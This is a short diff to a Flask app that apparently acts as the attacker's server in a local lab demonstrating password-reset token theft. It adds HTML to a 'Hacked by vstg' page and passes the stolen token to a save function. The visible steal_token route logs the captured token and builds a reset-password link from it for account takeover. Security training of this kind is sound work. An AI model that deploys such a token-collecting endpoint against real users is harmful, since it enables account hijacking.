@@ -7,6 +7,15 @@ app = Flask(__name__)
 
 #html
 ATTACKER_HTML = """
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="/static/style.css">
+<title>Gotcha</title>
+</head>
+<body class="attacker-body">
 <h1>Hacked by vstg</h1>
 
 <p>Stolen token:</p>
@@ -29,8 +38,7 @@ def steal_token():
     print(f"[ATTACKER] Token stolen: {token}")
     print(f"http://127.0.0.1:5000/reset-password?token={token}\n")
     
-    #Teso implementiraj ovu funkciju i obrisi zadnju liniju u html kad je iskoristis
-    save_to_file()
+    save_to_file(token)
 
     #ispis stranice
     return ATTACKER_HTML.format(token=token)
